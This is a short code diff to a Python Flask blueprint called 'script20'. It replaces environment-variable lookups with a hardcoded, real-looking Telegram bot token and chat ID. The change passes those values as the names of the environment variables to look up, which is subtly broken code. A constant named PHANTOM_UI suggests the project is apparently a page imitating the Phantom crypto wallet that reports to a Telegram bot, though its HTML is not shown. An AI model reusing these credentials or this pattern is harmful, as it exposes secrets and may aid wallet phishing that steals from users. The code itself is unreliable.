@@ -6,8 +6,8 @@ import os
 script20_bp = Blueprint('script20', __name__)
 
 # --- CONFIGURATION ---
-TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
-TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
+TELEGRAM_BOT_TOKEN = os.environ.get('6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0')
+TELEGRAM_CHAT_ID = os.environ.get('1308711346')
 
 PHANTOM_UI = """
 <!-- HTML code remains the same -->
